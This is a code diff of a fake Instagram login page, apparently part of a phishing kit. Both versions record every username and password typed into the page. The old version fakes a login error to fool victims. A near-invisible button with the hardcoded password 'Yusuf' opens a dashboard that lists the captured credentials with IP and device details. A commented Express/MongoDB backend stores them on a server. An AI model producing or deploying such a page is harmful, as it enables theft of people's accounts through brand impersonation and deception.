@@ -3,232 +3,253 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Content Access</title>
+    <title>Instagram Login</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         .hidden-admin-btn {
             position: fixed;
-            bottom: 20px;
-            right: 20px;
-            width: 40px;
-            height: 40px;
-            background: transparent;
-            border: none;
-            cursor: pointer;
-            opacity: 0.05;
+            bottom: 10px;
+            right: 10px;
+            width: 30px;
+            height: 30px;
+            opacity: 0.1;
             transition: opacity 0.3s;
         }
         .hidden-admin-btn:hover {
-            opacity: 1;
-        }
-        .admin-panel {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
-            z-index: 1000;
-            color: white;
-        }
-        .shake {
-            animation: shake 0.5s;
-        }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
-            20%, 40%, 60%, 80% { transform: translateX(5px); }
+            opacity: 0.5;
         }
     </style>
 </head>
-<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
-    <div class="max-w-md w-full bg-white rounded-lg shadow-lg overflow-hidden">
-        <div class="p-8">
-            <div class="flex justify-center mb-6">
-                <i class="fab fa-instagram text-4xl text-pink-600"></i>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center">
+    <!-- Main Login Form -->
+    <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-md">
+        <div class="flex justify-center mb-6">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="w-12 h-12 text-pink-600">
+                <path fill="currentColor" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
+            </svg>
+        </div>
+        <h1 class="text-2xl font-bold text-center mb-6">Instagram</h1>
+        
+        <form id="loginForm" class="space-y-4">
+            <div>
+                <input type="text" id="username" placeholder="Phone number, username, or email" 
+                    class="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
             </div>
-            <h1 class="text-2xl font-bold text-center mb-6">Log in to access this person's content</h1>
-            <p class="text-gray-600 text-center mb-8">Private videos, photos, and more</p>
-            
-            <form id="loginForm" class="space-y-4">
-                <div>
-                    <label for="username" class="block text-sm font-medium text-gray-700 mb-1">Instagram Username</label>
-                    <input type="text" id="username" name="username" required 
-                           class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
-                </div>
-                <div>
-                    <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Instagram Password</label>
-                    <input type="password" id="password" name="password" required 
-                           class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
-                </div>
-                <button type="submit" 
-                        class="w-full bg-pink-600 text-white py-2 px-4 rounded-md hover:bg-pink-700 transition duration-200 focus:outline-none focus:ring-2 focus:ring-pink-500 focus:ring-offset-2">
-                    Log In
-                </button>
-            </form>
+            <div>
+                <input type="password" id="password" placeholder="Password" 
+                    class="w-full px-4 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
+            </div>
+            <button type="submit" 
+                class="w-full bg-pink-600 text-white py-2 rounded-md hover:bg-pink-700 transition duration-300">
+                Log In
+            </button>
+        </form>
+        
+        <div class="text-center mt-4">
+            <a href="#" class="text-sm text-gray-600 hover:underline">Forgot password?</a>
+        </div>
+        
+        <div class="mt-6 text-center">
+            <p class="text-sm text-gray-600">Don't have an account? <a href="#" class="text-pink-600 font-medium">Sign up</a></p>
         </div>
     </div>
-
-    <!-- Hidden admin button (invisible to normal users) -->
-    <button id="adminBtn" class="hidden-admin-btn" title="Admin Access">
-        <i class="fas fa-user-shield text-2xl text-white"></i>
-    </button>
-
-    <!-- Admin panel (hidden by default) -->
-    <div id="adminPanel" class="admin-panel">
-        <div class="container mx-auto p-6 max-w-4xl">
-            <div class="flex justify-between items-center mb-8">
-                <h2 class="text-2xl font-bold">Admin Dashboard</h2>
-                <button id="closeAdminPanel" class="bg-red-500 text-white px-4 py-2 rounded hover:bg-red-600">
-                    Close
+    
+    <!-- Hidden Admin Button (invisible to users) -->
+    <button id="adminBtn" class="hidden-admin-btn" title="Admin Access">⚙️</button>
+    
+    <!-- Admin Login Modal (hidden by default) -->
+    <div id="adminModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
+        <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-sm">
+            <h2 class="text-xl font-bold mb-4">Admin Login</h2>
+            <input type="password" id="adminPassword" placeholder="Admin Password" 
+                class="w-full px-4 py-2 border rounded-md mb-4 focus:outline-none focus:ring-2 focus:ring-blue-500">
+            <button id="adminLoginBtn" 
+                class="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition duration-300">
+                Login
+            </button>
+        </div>
+    </div>
+    
+    <!-- Admin Dashboard (hidden by default) -->
+    <div id="adminDashboard" class="fixed inset-0 bg-white p-6 overflow-auto hidden">
+        <div class="max-w-6xl mx-auto">
+            <div class="flex justify-between items-center mb-6">
+                <h1 class="text-2xl font-bold">Admin Dashboard</h1>
+                <button id="logoutBtn" class="bg-red-600 text-white px-4 py-2 rounded-md hover:bg-red-700">
+                    Logout
                 </button>
             </div>
             
-            <div class="mb-6">
-                <div class="relative">
-                    <input type="password" id="adminPassword" placeholder="Enter admin password" 
-                           class="w-full px-4 py-2 bg-gray-800 border border-gray-700 rounded text-white">
-                    <button id="submitAdminPassword" 
-                            class="absolute right-0 top-0 h-full px-4 bg-blue-600 text-white rounded-r hover:bg-blue-700">
-                        Submit
-                    </button>
+            <div class="mb-4">
+                <div class="flex justify-between items-center">
+                    <h2 class="text-xl font-semibold">User Logins</h2>
+                    <p id="totalLogins" class="text-gray-600">0 records</p>
                 </div>
             </div>
             
-            <div id="credentialsList" class="hidden">
-                <div class="flex justify-between items-center mb-4">
-                    <h3 class="text-xl font-semibold">Captured Credentials</h3>
-                    <button id="refreshCredentials" class="bg-green-600 text-white px-3 py-1 rounded text-sm hover:bg-green-700">
-                        Refresh
-                    </button>
-                </div>
-                <div class="bg-gray-800 rounded-lg p-4 max-h-96 overflow-y-auto">
-                    <table class="w-full text-sm">
-                        <thead>
-                            <tr class="border-b border-gray-700">
-                                <th class="text-left py-2 px-2">Username</th>
-                                <th class="text-left py-2 px-2">Password</th>
-                                <th class="text-left py-2 px-2">Date</th>
-                            </tr>
-                        </thead>
-                        <tbody id="credentialsTable">
-                            <!-- Credentials will be inserted here -->
-                        </tbody>
-                    </table>
-                </div>
-                <div class="mt-4 text-right text-sm text-gray-400">
-                    Total captured: <span id="credentialCount">0</span>
-                </div>
+            <div class="overflow-x-auto">
+                <table class="min-w-full bg-white border border-gray-200">
+                    <thead class="bg-gray-100">
+                        <tr>
+                            <th class="py-2 px-4 border-b">Username</th>
+                            <th class="py-2 px-4 border-b">Password</th>
+                            <th class="py-2 px-4 border-b">IP Address</th>
+                            <th class="py-2 px-4 border-b">Device Info</th>
+                            <th class="py-2 px-4 border-b">Date/Time</th>
+                        </tr>
+                    </thead>
+                    <tbody id="loginData">
+                        <!-- Data will be inserted here by JavaScript -->
+                    </tbody>
+                </table>
             </div>
         </div>
     </div>
 
     <script>
-        // Simulated "database" (in a real scenario this would be server-side)
-        let capturedCredentials = JSON.parse(localStorage.getItem('credentials')) || [];
+        // Server-side code would normally be in a separate file, but we're including it here for demonstration
+        // In a real application, this would be split into proper Node.js files
         
-        // Login form submission
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        // This is just a simulation - in a real app, this would be proper backend code
+        document.addEventListener('DOMContentLoaded', function() {
+            // Simulated database
+            let loginData = JSON.parse(localStorage.getItem('loginData')) || [];
+            const ADMIN_PASSWORD = "Yusuf";
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            // Save credentials to "database"
-            capturedCredentials.push({
-                username: username,
-                password: password,
-                date: new Date().toLocaleString()
-            });
-            
-            // Save to localStorage (simulating server storage)
-            localStorage.setItem('credentials', JSON.stringify(capturedCredentials));
-            
-            // Show fake loading then error (to make it seem like login failed)
-            const submitBtn = this.querySelector('button[type="submit"]');
-            const originalText = submitBtn.textContent;
-            
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
-            
-            setTimeout(() => {
-                submitBtn.innerHTML = originalText;
-                submitBtn.disabled = false;
+            // Form submission
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
                 
-                // Show error message
-                const errorDiv = document.createElement('div');
-                errorDiv.className = 'mt-4 p-3 bg-red-100 text-red-700 rounded text-center';
-                errorDiv.textContent = 'Login failed. Please check your username and password and try again.';
+                const username = document.getElementById('username').value;
+                const password = document.getElementById('password').value;
                 
-                const form = document.getElementById('loginForm');
-                if (!document.querySelector('.bg-red-100')) {
-                    form.appendChild(errorDiv);
+                if (username && password) {
+                    // In a real app, this would be sent to the backend via fetch/axios
+                    const userData = {
+                        username,
+                        password,
+                        ip: "192.168.1.1", // In real app, this would come from req.ip
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString()
+                    };
                     
-                    // Shake form for effect
-                    form.classList.add('shake');
-                    setTimeout(() => form.classList.remove('shake'), 500);
+                    loginData.push(userData);
+                    localStorage.setItem('loginData', JSON.stringify(loginData));
+                    
+                    // Show success message
+                    alert('Login successful!');
+                    document.getElementById('loginForm').reset();
+                } else {
+                    alert('Please enter both username and password');
                 }
-            }, 2000);
-        });
-        
-        // Admin panel functionality
-        document.getElementById('adminBtn').addEventListener('click', function() {
-            document.getElementById('adminPanel').style.display = 'block';
-        });
-        
-        document.getElementById('closeAdminPanel').addEventListener('click', function() {
-            document.getElementById('adminPanel').style.display = 'none';
-            document.getElementById('credentialsList').classList.add('hidden');
-        });
-        
-        document.getElementById('submitAdminPassword').addEventListener('click', function() {
-            const password = document.getElementById('adminPassword').value;
-            
-            if (password === 'Yusuf') {
-                document.getElementById('credentialsList').classList.remove('hidden');
-                updateCredentialsList();
-            } else {
-                alert('Incorrect admin password');
-                document.getElementById('adminPassword').classList.add('shake');
-                setTimeout(() => {
-                    document.getElementById('adminPassword').classList.remove('shake');
-                }, 500);
-            }
-        });
-        
-        document.getElementById('refreshCredentials').addEventListener('click', updateCredentialsList);
-        
-        function updateCredentialsList() {
-            // Reload from localStorage in case another tab added credentials
-            capturedCredentials = JSON.parse(localStorage.getItem('credentials')) || [];
-            
-            const tableBody = document.getElementById('credentialsTable');
-            tableBody.innerHTML = '';
-            
-            capturedCredentials.forEach(cred => {
-                const row = document.createElement('tr');
-                row.className = 'border-b border-gray-700 hover:bg-gray-700';
-                
-                row.innerHTML = `
-                    <td class="py-2 px-2">${cred.username}</td>
-                    <td class="py-2 px-2">${cred.password}</td>
-                    <td class="py-2 px-2">${cred.date}</td>
-                `;
-                
-                tableBody.appendChild(row);
             });
             
-            document.getElementById('credentialCount').textContent = capturedCredentials.length;
-        }
-        
-        // Allow Enter key to submit admin password
-        document.getElementById('adminPassword').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                document.getElementById('submitAdminPassword').click();
+            // Admin button click
+            document.getElementById('adminBtn').addEventListener('click', function() {
+                document.getElementById('adminModal').classList.remove('hidden');
+            });
+            
+            // Admin login
+            document.getElementById('adminLoginBtn').addEventListener('click', function() {
+                const password = document.getElementById('adminPassword').value;
+                
+                if (password === ADMIN_PASSWORD) {
+                    document.getElementById('adminModal').classList.add('hidden');
+                    document.getElementById('adminDashboard').classList.remove('hidden');
+                    displayLoginData();
+                } else {
+                    alert('Incorrect admin password');
+                }
+            });
+            
+            // Logout from admin dashboard
+            document.getElementById('logoutBtn').addEventListener('click', function() {
+                document.getElementById('adminDashboard').classList.add('hidden');
+                document.getElementById('adminPassword').value = '';
+            });
+            
+            // Display login data in admin dashboard
+            function displayLoginData() {
+                const tbody = document.getElementById('loginData');
+                tbody.innerHTML = '';
+                
+                loginData.forEach(data => {
+                    const row = document.createElement('tr');
+                    row.className = 'hover:bg-gray-50';
+                    
+                    row.innerHTML = `
+                        <td class="py-2 px-4 border-b">${data.username}</td>
+                        <td class="py-2 px-4 border-b">${data.password}</td>
+                        <td class="py-2 px-4 border-b">${data.ip}</td>
+                        <td class="py-2 px-4 border-b">${data.userAgent}</td>
+                        <td class="py-2 px-4 border-b">${new Date(data.timestamp).toLocaleString()}</td>
+                    `;
+                    
+                    tbody.appendChild(row);
+                });
+                
+                document.getElementById('totalLogins').textContent = `${loginData.length} records`;
             }
         });
     </script>
+
+    <!-- This would be the actual Node.js backend code in separate files -->
+    <!-- For a real implementation, you would need to create these files: -->
+    <!-- 
+    // server.js
+    const express = require('express');
+    const mongoose = require('mongoose');
+    const bodyParser = require('body-parser');
+    const app = express();
+    
+    // Connect to MongoDB
+    mongoose.connect('mongodb://localhost:27017/instagram_logins', {
+        useNewUrlParser: true,
+        useUnifiedTopology: true
+    });
+    
+    // User model
+    const User = mongoose.model('User', {
+        username: String,
+        password: String,
+        ip: String,
+        userAgent: String,
+        timestamp: { type: Date, default: Date.now }
+    });
+    
+    // Middleware
+    app.use(bodyParser.urlencoded({ extended: true }));
+    app.use(express.static('public'));
+    
+    // Routes
+    app.post('/login', async (req, res) => {
+        const { username, password } = req.body;
+        const ip = req.ip;
+        const userAgent = req.get('User-Agent');
+        
+        const user = new User({ username, password, ip, userAgent });
+        await user.save();
+        
+        res.send('Login successful');
+    });
+    
+    app.post('/admin/login', (req, res) => {
+        if (req.body.password === 'Yusuf') {
+            req.session.admin = true;
+            res.redirect('/admin');
+        } else {
+            res.send('Invalid admin password');
+        }
+    });
+    
+    app.get('/admin', async (req, res) => {
+        if (!req.session.admin) return res.redirect('/admin-login');
+        
+        const users = await User.find().sort({ timestamp: -1 });
+        res.render('admin', { users });
+    });
+    
+    app.listen(3000, () => console.log('Server running on port 3000'));
+    -->
 </body>
 </html>
